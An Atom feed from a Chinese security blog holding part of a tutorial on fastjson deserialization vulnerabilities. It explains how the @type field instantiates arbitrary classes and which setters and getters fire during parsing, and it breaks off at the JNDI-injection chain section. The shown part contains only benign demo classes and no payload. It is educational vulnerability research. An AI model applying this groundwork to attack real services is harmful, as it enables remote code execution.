<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>啦啦菌NODE</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://lalajun.com/"/>
  <updated>2019-12-30T03:02:06.764Z</updated>
  <id>http://lalajun.com/</id>
  
  <author>
    <name>LaLa</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>java反序列化-fastjson</title>
    <link href="http://lalajun.com/2019/12/30/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-fastjson/"/>
    <id>http://lalajun.com/2019/12/30/java反序列化-fastjson/</id>
    <published>2019-12-30T01:05:28.000Z</published>
    <updated>2019-12-30T03:02:06.764Z</updated>
    
    <content type="html"><![CDATA[<p>推荐阅读时间：60min<br>全文字数：14026</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>其实从一开始就是想着学一下fastjson组件的反序列化。结果发现完全理解不能。</p><p>就先一路补了很多其他知识点，RMI反序列化，JNDI注入，7u21链等（就是之前的文章），之后也是拖了很长时间，花了很长时间，总算把这篇一开始就想写的文，给补完了。</p><p>类似的文是已经有了不少，学习也是基于前辈们的文章一步步走来，但是个人习惯于把所有问题理清楚，讲清楚。理应是把大佬们的文要细致些。</p><p>本文需要前置知识：JNDI注入，7u21利用链，可以戳我往期的文章。</p><p>文章内容如下：</p><ol><li>fastjson组件基础介绍及使用（三种反序列化形式等）</li><li>fastjson组件的<strong>@type标识</strong>的特性说明（默认调用setter、getter方法条件等）。</li><li>分析了fastjson组件<strong>1.2.24版本</strong>中JNDI注入利用链与setter参数巧妙完美适配（前置知识参考JNDI注入一文）</li><li>分析了fastjson组件<strong>1.2.24版本</strong>中JDK1.7TemplatesImpl利用链的漏洞触发点poc构造（前置知识参考7u21一文）</li><li>分析了1.2.24-1.2.46版本每个版本迭代中修改代码，修复思路和绕过。（此时由于默认白名单的引入，漏洞危害大降）</li><li>到了1.2.47通杀黑白名单漏洞，因为网上对于这个分析文有点过多。这边想着直接正向来没得意思。尝试从代码审计漏洞挖掘的角度去从零开始挖掘出这一条利用链。最后发现产生了一种我上我也行的错觉（当然实际上只是一种错觉，不可避免受到了已有payload的引导，但是经过分析也算是不会对大佬的0day产生一种畏惧心理，看完也是可以理解的）最后再看了下修复。</li></ol><p>本文实验代码均上传<a href="https://github.com/lalajun/Fastjson_Deserialize" target="_blank" rel="noopener">github</a>，那么想要好好学习的小伙伴请打开idea，配合食用。</p><h2 id="fastjson组件"><a href="#fastjson组件" class="headerlink" title="fastjson组件"></a>fastjson组件</h2><p>fastjson组件是阿里巴巴开发的反序列化与序列化组件，具体细节可以参考<a href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN" target="_blank" rel="noopener">github文档</a></p><p>组件api使用方法也很简洁<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//序列化</span></span><br><span class="line">String text = JSON.toJSONString(obj); </span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line">VO vo = JSON.parse(); <span class="comment">//解析为JSONObject类型或者JSONArray类型</span></span><br><span class="line">VO vo = JSON.parseObject(<span class="string">"&#123;...&#125;"</span>); <span class="comment">//JSON文本解析成JSONObject类型</span></span><br><span class="line">VO vo = JSON.parseObject(<span class="string">"&#123;...&#125;"</span>, VO.class); <span class="comment">//JSON文本解析成VO.class类</span></span><br></pre></td></tr></table></figure></p><p>我们通过demo来使用一下这个组件</p><p>以下使用测试均是基于1.2.24版本的fastjson jar包</p><p>靶机搭建需要存在漏洞的jar包，但是在github上通常会下架存在漏洞的jar包。</p><p>我们可以从<a href="https://mvnrepository.com/artifact/com.alibaba/fastjson/1.2.24" target="_blank" rel="noopener">maven仓库</a>中找到所有版本jar包,方便漏洞复现。</p><h3 id="fastjson组件使用"><a href="#fastjson组件使用" class="headerlink" title="fastjson组件使用"></a>fastjson组件使用</h3><p>先构建需要序列化的User类：<br><code>User.java</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>再使用fastjson组件<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建一个用于实验的user类</span></span><br><span class="line">        User user1 = <span class="keyword">new</span> User();</span><br><span class="line">        user1.setName(<span class="string">"lala"</span>);</span><br><span class="line">        user1.setAge(<span class="number">11</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        String serializedStr = JSON.toJSONString(user1);</span><br><span class="line">        System.out.println(<span class="string">"serializedStr="</span>+serializedStr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过parse方法进行反序列化，返回的是一个JSONObject</span></span><br><span class="line">        Object obj1 = JSON.parse(serializedStr);</span><br><span class="line">        System.out.println(<span class="string">"parse反序列化对象名称:"</span>+obj1.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"parse反序列化："</span>+obj1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过parseObject,不指定类，返回的是一个JSONObject</span></span><br><span class="line">        Object obj2 = JSON.parseObject(serializedStr);</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化对象名称:"</span>+obj2.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化:"</span>+obj2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过parseObject,指定类后返回的是一个相应的类对象</span></span><br><span class="line">        Object obj3 = JSON.parseObject(serializedStr,User.class);</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化对象名称:"</span>+obj3.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化:"</span>+obj3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>以上使用了三种形式反序列化<br>结果如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//序列化</span></span><br><span class="line">serializedStr=&#123;<span class="string">"age"</span>:<span class="number">11</span>,<span class="string">"name"</span>:<span class="string">"lala"</span>&#125;</span><br><span class="line"><span class="comment">//parse(&#123;..&#125;)反序列化</span></span><br><span class="line">parse反序列化对象名称:com.alibaba.fastjson.JSONObject</span><br><span class="line">parse反序列化：&#123;<span class="string">"name"</span>:<span class="string">"lala"</span>,<span class="string">"age"</span>:<span class="number">11</span>&#125;</span><br><span class="line"><span class="comment">//parseObject(&#123;..&#125;)反序列化</span></span><br><span class="line">parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject</span><br><span class="line">parseObject反序列化:&#123;<span class="string">"name"</span>:<span class="string">"lala"</span>,<span class="string">"age"</span>:<span class="number">11</span>&#125;</span><br><span class="line"><span class="comment">//parseObject(&#123;&#125;,class)反序列化</span></span><br><span class="line">parseObject反序列化对象名称:com.fastjson.User</span><br><span class="line">parseObject反序列化:com.fastjson.User@<span class="number">3</span>d71d552</span><br></pre></td></tr></table></figure></p><p>parseObject({..})其实就是parse({..})的一个封装，对于parse的结果进行一次结果判定然后转化为JSONOBject类型。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title">parseObject</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">    Object obj = parse(text);</span><br><span class="line">    <span class="keyword">return</span> obj <span class="keyword">instanceof</span> JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>而parseObject({},class)好像会调用class加载器进行类型转化，但这个细节不是关键，就不研究了</p><p>那么三种反序列化方式除了返回结果之外，还有啥区别？</p><p>在执行过程调用函数上有不同。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FastJsonTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String age;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FastJsonTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String test)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"name setter called"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = test;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"name getter called"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAge</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"age getter called"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Object obj = JSON.parse(<span class="string">"&#123;\"@type\":\"com.fastjson.FastJsonTest\",\"name\":\"thisisname\", \"age\":\"thisisage\"&#125;"</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line"></span><br><span class="line">        Object obj2 = JSON.parseObject(<span class="string">"&#123;\"@type\":\"com.fastjson.FastJsonTest\",\"name\":\"thisisname\", \"age\":\"thisisage\"&#125;"</span>);</span><br><span class="line">        System.out.println(obj2);</span><br><span class="line"></span><br><span class="line">        Object obj3 = JSON.parseObject(<span class="string">"&#123;\"@type\":\"com.fastjson.FastJsonTest\",\"name\":\"thisisname\", \"age\":\"thisisage\"&#125;"</span>,FastJsonTest.class);</span><br><span class="line">        System.out.println(obj3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>结果如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//JSON.parse("")</span></span><br><span class="line">name setter called</span><br><span class="line">com.fastjson.FastJsonTest@<span class="number">5</span>a2e4553</span><br><span class="line"><span class="comment">//JSON.parseObject("")</span></span><br><span class="line">name setter called</span><br><span class="line">age getter called</span><br><span class="line">name getter called</span><br><span class="line">&#123;<span class="string">"name"</span>:<span class="string">"thisisname"</span>,<span class="string">"age"</span>:<span class="string">"thisisage"</span>&#125;</span><br><span class="line"><span class="comment">//JSON.parseObject("",class)</span></span><br><span class="line">name setter called</span><br><span class="line">com.fastjson.FastJsonTest<span class="meta">@e</span>2144e4</span><br></pre></td></tr></table></figure></p><p>结论：</p><ul><li>parse(“”) 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法</li><li>parseObject(“”) 会调用反序列化目标类的特定 setter 和 getter 方法（此处有的博客说是所有setter，个人测试返回String的setter是不行的，此处打个问号）</li><li>parseObject(“”,class) 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法</li></ul><p>特定的setter和getter的调用都是在解析过程中的调用。（具体是哪些setter和getter会被调用，我们将在之后讲到）</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae284qq65j31tz122wl9.jpg" alt="setter解析中执行.png"></p><p>之所以<strong>parseObject(“”)</strong>有区别就是因为<strong>parseObject(“”)</strong>比起其他方式多了一步<strong>toJSON</strong>操作，在这一步中会对所有getter进行调用。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae27y570pj31va0ylted.jpg" alt="getter全调用.png"></p><h3 id="type"><a href="#type" class="headerlink" title="@type"></a>@type</h3><p>那么除开正常的序列化，反序列化。<br>fastjson提供特殊字符段<code>@type</code>，这个字段可以指定反序列化任意类，并且会自动调用类中属性的特定的set，get方法。</p><p>我们先来看一下这个字段的使用:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@使用特定修饰符，写入@type序列化</span></span><br><span class="line">String serializedStr1 = JSON.toJSONString(user1,SerializerFeature.WriteClassName);</span><br><span class="line">System.out.println(<span class="string">"serializedStr1="</span>+serializedStr1);</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过parse方法进行反序列化</span></span><br><span class="line">Object obj4 = JSON.parse(serializedStr1);</span><br><span class="line">System.out.println(<span class="string">"parse反序列化对象名称:"</span>+obj4.getClass().getName());</span><br><span class="line">System.out.println(<span class="string">"parseObject反序列化:"</span>+obj4);</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过这种方式返回的是一个相应的类对象</span></span><br><span class="line">Object obj5 = JSON.parseObject(serializedStr1);</span><br><span class="line">System.out.println(<span class="string">"parseObject反序列化对象名称:"</span>+obj5.getClass().getName());</span><br><span class="line">System.out.println(<span class="string">"parseObject反序列化:"</span>+obj5);</span><br></pre></td></tr></table></figure></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//序列化</span></span><br><span class="line">serializedStr1=&#123;<span class="string">"@type"</span>:<span class="string">"com.fastjson.User"</span>,<span class="string">"age"</span>:<span class="number">11</span>,<span class="string">"name"</span>:<span class="string">"lala"</span>&#125;</span><br><span class="line"><span class="comment">//parse反序列化</span></span><br><span class="line">parse反序列化对象名称:com.fastjson.User</span><br><span class="line">parseObject反序列化:com.fastjson.User@<span class="number">1</span>cf4f579</span><br><span class="line"><span class="comment">//parseObject反序列化</span></span><br><span class="line">parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject</span><br><span class="line">parseObject反序列化:&#123;<span class="string">"name"</span>:<span class="string">"lala"</span>,<span class="string">"age"</span>:<span class="number">11</span>&#125;</span><br></pre></td></tr></table></figure><p>这边在调试的时候，可以看到，本该解析出来的@type都没有解析出来</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae27qrizoj30qk07yglz.jpg" alt="@type反序列化.png"></p><p>以上我们可以知道当@type输入的时候会特殊解析（不然的话会有@type：com.fastjson.User的键值对），那么自动调用其特定的set，get方法怎么说呢？</p><p>我们先建立一个序列化实验用的Person类</p><p><code>Person.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String full_name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> Boolean sex;</span><br><span class="line">    <span class="keyword">private</span> Properties prop;</span><br><span class="line"><span class="comment">//构造函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Person构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//set</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setAge()"</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//get 返回Boolean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Boolean <span class="title">getSex</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getSex()"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//get 返回ProPerties</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Properties <span class="title">getProp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getProp()"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.prop;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//在输出时会自动调用的对象ToString函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String s = <span class="string">"[Person Object] name="</span> + <span class="keyword">this</span>.name + <span class="string">" full_name="</span> + <span class="keyword">this</span>.full_name  + <span class="string">", age="</span> + <span class="keyword">this</span>.age + <span class="string">", prop="</span> + <span class="keyword">this</span>.prop + <span class="string">", sex="</span> + <span class="keyword">this</span>.sex;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>@type反序列化实验：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">type</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String eneity3 = <span class="string">"&#123;\"@type\":\"com.fastjson.Person\", \"name\":\"lala\", \"full_name\":\"lalalolo\", \"age\": 13, \"prop\": &#123;\"123\":123&#125;, \"sex\": 1&#125;"</span>;</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        Object obj = JSON.parseObject(eneity3,Person.class);</span><br><span class="line">        <span class="comment">//输出会调用obj对象的tooString函数</span></span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Person构造函数</span><br><span class="line">setAge()</span><br><span class="line">getProp()</span><br><span class="line">[Person Object] name=lala full_name=null, age=13, prop=null, sex=null</span><br><span class="line"></span><br><span class="line">public name 反序列化成功</span><br><span class="line">private full_name 反序列化失败</span><br><span class="line">private age setAge函数被调用</span><br><span class="line">private sex getsex函数没有被调用</span><br><span class="line">private prop getprop函数被成功调用</span><br></pre></td></tr></table></figure><p>可以得知：</p><ul><li>public修饰符的属性会进行反序列化赋值，private修饰符的属性不会直接进行反序列化赋值，而是会调用setxxx(xxx为属性名)的函数进行赋值。</li><li>getxxx(xxx为属性名)的函数会根据函数返回值的不同，而选择被调用或不被调用</li></ul><p>决定这个set/get函数是否将被调用的代码最终在<code>com.alibaba.fastjson.util.JavaBeanInfo#build</code>函数处</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae27is4imj31xh0rg7an.jpg" alt="解析set-get.png"></p><p>在进入build函数后会遍历一遍传入class的所有方法，去寻找满足set开头的特定类型方法；再遍历一遍所有方法去寻找get开头的特定类型的方法</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae27eideej31sm0pw156.jpg" alt="set条件.png"></p><p><strong>set开头的方法要求如下：</strong></p><ul><li>方法名长度大于4且以set开头，且第四个字母要是大写</li><li>非静态方法</li><li>返回类型为void或当前类</li><li>参数个数为1个</li></ul><p>寻找到符合要求的set开头的方法后会根据一定规则提取方法名后的变量名（好像会过滤_，就是set_name这样的方法名中的下划线会被略过，得到name）。再去跟这个类的属性去比对有没有这个名称的属性。</p><p>如果没有这个属性并且这个set方法的输入是一个布尔型（是boolean类型，不是Boolean类型，这两个是不一样的），会重新给属性名前面加上<strong>is</strong>，再取头两个字符，第一个字符为大写（即isNa），去寻找这个属性名。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae26zr372j31w30ggtba.jpg" alt="get条件.png"></p><blockquote><p>这里的is就是有的网上有的文章中说反序列化会自动调用get、set、is方法的由来。个人觉得这种说法应该是错误的。</p><p>真实情况应该是确认存在符合setXxx方法后，会与这个方法绑定一个xxx属性，如果xxx属性不存在则会绑定isXx属性（这里is后第一个字符需要大写，才会被绑定）。并没有调用is开头的方法</p><p>自己从源码中分析或者尝试在类中添加isXx方法都是不会被调用的，这里只是为了指出其他文章中的一个错误。这个与调用的set方法绑定的属性，再之后并没有发现对于调用过程有什么影响。</p><p>所以只要目标类中有满足条件的set方法，然后得到的方法变量名存在于序列化字符串中，这个set方法就可以被调用。</p><p>如果有老哥确定是否可以调用is方法，可以联系我，非常感谢。</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae26zr372j31w30ggtba.jpg" alt="get条件.png"></p><p><strong>get开头的方法要求如下：</strong></p><ul><li>方法名长度大于等于4        </li><li>非静态方法</li><li>以get开头且第4个字母为大写</li><li>无传入参数</li><li>返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</li></ul><p>所以我们上面例子中的getsex方法没有被调用是因为返回类型不符合，而getprop方法被成功调用是因为Properties 继承 Hashtable，而Hashtable实现了Map接口，返回类型符合条件。</p><p>再顺便看一下最后触发方法调用的地方com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue，（在被调用的方法中下断点即可）</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae26u6n7bj31ha0oxdia.jpg" alt="调用方法处.png"></p><p>那么至此我们可以知道</p><ul><li>@type可以指定反序列化成服务器上的任意类</li><li>然后服务端会解析这个类，提取出这个类中符合要求的setter方法与getter方法（如setxxx）</li><li>如果传入json字符串的键值中存在这个值（如xxx)，就会去调用执行对应的setter、getter方法（即setxxx方法、getxxx方法）</li></ul><blockquote><p>上面说到readObejct(“”)还会额外调用toJSON调用所有getter函数，可以不符合要求。</p></blockquote><p>看上去应该是挺正常的使用逻辑，反序列化需要调用对应参数的setter、getter方法来恢复数据。</p><p>但是在可以调用任意类的情况下，如果setter、getter方法中存在可以利用的情况，就会导致任意命令执行。</p><p>对应反序列化攻击利用三要素来说，以上我们就是找到了readObject复写点，下面来探讨反序列化利用链。</p><p>我们先来看最开始的漏洞版本是&lt;=1.2.24，在这个版本前是默认支持@type这个属性的。</p><h2 id="【-lt-1-2-24】JNDI注入利用链——com-sun-rowset-JdbcRowSetImpl"><a href="#【-lt-1-2-24】JNDI注入利用链——com-sun-rowset-JdbcRowSetImpl" class="headerlink" title="【&lt;=1.2.24】JNDI注入利用链——com.sun.rowset.JdbcRowSetImpl"></a>【&lt;=1.2.24】JNDI注入利用链——com.sun.rowset.JdbcRowSetImpl</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>JNDI注入利用链是通用性最强的利用方式，在以下三种反序列化中均可使用：<br><figure class="highlight java"><table><tr><td 